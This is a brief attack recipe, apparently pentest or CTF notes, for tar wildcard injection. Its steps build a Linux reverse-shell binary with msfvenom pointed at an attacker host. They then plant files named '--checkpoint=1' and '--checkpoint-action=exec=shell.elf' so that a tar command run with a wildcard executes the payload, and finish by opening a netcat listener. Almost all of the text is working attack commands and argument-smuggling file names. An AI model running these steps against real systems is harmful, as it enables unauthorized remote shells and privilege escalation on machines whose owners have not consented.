1. Note that the tar command is being run with a wildcard (*) in your home directory.
2. On kali:-
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf -o shell.elf
```
3. On attack box upload the binary.
4. 
```console
touch {Directory in which wildcard is used}/--checkpoint=1
touch {Directory in which wild card is used}/--checkpoint-action=exec=shell.elf
```
5. Start netcat listener on attacker machine.